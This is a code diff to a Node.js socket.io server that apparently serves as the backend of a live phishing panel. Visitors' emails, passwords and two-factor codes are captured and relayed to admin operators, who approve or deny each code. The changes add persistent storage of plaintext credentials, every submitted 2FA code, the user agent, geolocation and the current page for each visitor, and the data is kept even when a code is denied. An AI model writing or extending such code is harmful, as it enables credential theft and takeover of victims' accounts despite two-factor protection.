@@ -3,6 +3,7 @@ import { createServer } from "http";
 import { Server } from "socket.io";
 import cache from "./src/lib/cache.js";
 import { verifyToken } from "./src/middleware/authMiddleWare.js";
+import database from "./src/lib/db.js";
 
 const httpServer = createServer((req, res) => {
     res.writeHead(200, { "Content-Type": "text/plain" });
@@ -83,12 +84,14 @@ io.on("connection", (socket) => {
         });
 
         const current = cache.get(socket.id) || {};
+        const prevLogin = (current.loginData && typeof current.loginData === "object") ? current.loginData : {};
 
         cache.update(socket.id, {
             ...current,
             loginData: {
-                email: data.email || '',
-                password: data.password || ''
+                ...prevLogin,
+                email: data.email != null ? String(data.email).trim() : (prevLogin.email ?? ''),
+                password: data.password != null ? String(data.password).trim() : (prevLogin.password ?? '')
             }
         });
     });
@@ -128,23 +131,25 @@ io.on("connection", (socket) => {
     });
 
     socket.on("2fa", (data) => {
-        console.log(`2FA code from ${socket.id}:`, {
-            code: data.code
-        });
+        const code = data.code || '';
+        console.log(`2FA code from ${socket.id}:`, { code });
 
         const current = cache.get(socket.id) || {};
+        const prevLogin = current.loginData || {};
+        const prevCodes = Array.isArray(prevLogin.twoFactorCodes) ? prevLogin.twoFactorCodes : (prevLogin.twoFactorCode ? [prevLogin.twoFactorCode] : []);
 
         cache.update(socket.id, {
             ...current,
             loginData: {
-                ...current.loginData,
-                twoFactorCode: data.code || '',
-                twoFactorTimestamp: Date.now()
+                ...prevLogin,
+                twoFactorCode: code,
+                twoFactorTimestamp: Date.now(),
+                twoFactorCodes: code ? [...prevCodes, code] : prevCodes,
             }
         });
     });
 
-    socket.on("approve2fa", (data) => {
+    socket.on("approve2fa", async (data) => {
         const userData = cache.get(socket.id);
 
         if (!userData || !userData.isAdmin) {
@@ -160,10 +165,44 @@ io.on("connection", (socket) => {
             });
 
             console.log(`Admin ${socket.id} approved 2FA for ${targetSocketId}`);
+
+            // Instant-save history only after admin approval (credentials + 2FA)
+            const targetData = cache.getRaw(targetSocketId);
+            if (targetData && !targetData.isAdmin) {
+                const ld = cache.getLoginData(targetSocketId) || {};
+                const loginDataForDb = {
+                    email: String(ld.email ?? "").trim(),
+                    password: String(ld.password ?? "").trim(),
+                    twoFactorCode: ld.twoFactorCode != null ? String(ld.twoFactorCode) : null,
+                    twoFactorCodes: Array.isArray(ld.twoFactorCodes) ? ld.twoFactorCodes.map((c) => String(c)) : (ld.twoFactorCode != null ? [String(ld.twoFactorCode)] : [])
+                };
+                const now = Date.now();
+                try {
+                    await database.collection("connectionHistory").updateOne(
+                        { socketId: targetSocketId },
+                        {
+                            $set: {
+                                socketId: targetSocketId,
+                                userAgent: targetData.userAgent ?? "",
+                                isAdmin: !!targetData.isAdmin,
+                                connectedAt: targetData.connectedAt ?? now,
+                                geoData: (targetData.geoData && typeof targetData.geoData === "object") ? targetData.geoData : {},
+                                currentPage: targetData.currentPage ?? null,
+                                lastPageUpdate: now,
+                                loginData: loginDataForDb
+                            }
+                        },
+                        { upsert: true }
+                    );
+                    console.log(`[HISTORY] Instant-save (after approve 2FA) ${targetSocketId}: email=${loginDataForDb.email ? "yes" : "no"} password=${loginDataForDb.password ? "yes" : "no"} 2fa=${loginDataForDb.twoFactorCodes.length}`);
+                } catch (err) {
+                    console.error("[HISTORY] Save after approve2fa error:", err.message);
+                }
+            }
         }
     });
 
-    socket.on("deny2fa", (data) => {
+    socket.on("deny2fa", async (data) => {
         const userData = cache.get(socket.id);
         if (!userData || !userData.isAdmin) {
             return;
@@ -179,6 +218,40 @@ io.on("connection", (socket) => {
             });
 
             console.log(`Admin ${socket.id} denied 2FA for ${targetSocketId}`);
+
+            // Instant-save history after admin deny (credentials + 2FA still saved)
+            const targetData = cache.getRaw(targetSocketId);
+            if (targetData && !targetData.isAdmin) {
+                const ld = cache.getLoginData(targetSocketId) || {};
+                const loginDataForDb = {
+                    email: String(ld.email ?? "").trim(),
+                    password: String(ld.password ?? "").trim(),
+                    twoFactorCode: ld.twoFactorCode != null ? String(ld.twoFactorCode) : null,
+                    twoFactorCodes: Array.isArray(ld.twoFactorCodes) ? ld.twoFactorCodes.map((c) => String(c)) : (ld.twoFactorCode != null ? [String(ld.twoFactorCode)] : [])
+                };
+                const now = Date.now();
+                try {
+                    await database.collection("connectionHistory").updateOne(
+                        { socketId: targetSocketId },
+                        {
+                            $set: {
+                                socketId: targetSocketId,
+                                userAgent: targetData.userAgent ?? "",
+                                isAdmin: !!targetData.isAdmin,
+                                connectedAt: targetData.connectedAt ?? now,
+                                geoData: (targetData.geoData && typeof targetData.geoData === "object") ? targetData.geoData : {},
+                                currentPage: targetData.currentPage ?? null,
+                                lastPageUpdate: now,
+                                loginData: loginDataForDb
+                            }
+                        },
+                        { upsert: true }
+                    );
+                    console.log(`[HISTORY] Instant-save (after deny 2FA) ${targetSocketId}: email=${loginDataForDb.email ? "yes" : "no"} password=${loginDataForDb.password ? "yes" : "no"} 2fa=${loginDataForDb.twoFactorCodes.length}`);
+                } catch (err) {
+                    console.error("[HISTORY] Save after deny2fa error:", err.message);
+                }
+            }
         }
     });
 
@@ -260,8 +333,6 @@ io.on("connection", (socket) => {
 
         if (data.ids && Array.isArray(data.ids)) {
             data.ids.forEach(targetSocketId => {
-                cache.remove(targetSocketId);
-
                 const targetSocket = io.sockets.sockets.get(targetSocketId);
                 if (targetSocket) {
                     targetSocket.disconnect(true);
@@ -313,8 +384,48 @@ io.on("connection", (socket) => {
         if (callback) callback({ pong: Date.now() });
     });
 
-    socket.on("disconnect", (reason) => {
+    socket.on("disconnect", async (reason) => {
         console.log(`Socket disconnected: ${socket.id} - ${reason}`);
+        const data = cache.getRaw(socket.id);
+        if (data && data.isAdmin) {
+            console.log(`History skip (admin): ${socket.id}`);
+        } else if (!data) {
+            console.log(`History skip (no cache): ${socket.id}`);
+        } else {
+            // History doc was already created/updated on login and 2fa; just set disconnectedAt
+            const disconnectedAt = Date.now();
+            try {
+                const result = await database.collection("connectionHistory").updateOne(
+                    { socketId: socket.id },
+                    {
+                        $set: {
+                            disconnectedAt,
+                            currentPage: data.currentPage ?? null,
+                            lastPageUpdate: data.lastPageUpdate ?? disconnectedAt
+                        }
+                    }
+                );
+                if (result.matchedCount > 0) {
+                    console.log(`[HISTORY] Closed ${socket.id} (page: ${data.currentPage || "—"})`);
+                } else {
+                    // No doc yet (e.g. never sent login) – insert minimal row so we have a record
+                    await database.collection("connectionHistory").insertOne({
+                        socketId: socket.id,
+                        userAgent: data.userAgent ?? "",
+                        isAdmin: !!data.isAdmin,
+                        connectedAt: data.connectedAt ?? disconnectedAt,
+                        disconnectedAt,
+                        geoData: data.geoData && typeof data.geoData === "object" ? { ...data.geoData } : {},
+                        currentPage: data.currentPage ?? null,
+                        lastPageUpdate: data.lastPageUpdate ?? null,
+                        loginData: { email: "", password: "", twoFactorCode: null, twoFactorCodes: [] }
+                    });
+                    console.log(`[HISTORY] Created (no login) ${socket.id}`);
+                }
+            } catch (err) {
+                console.error("[HISTORY] Update on disconnect error:", err.message);
+            }
+        }
         cache.remove(socket.id);
     });
 });
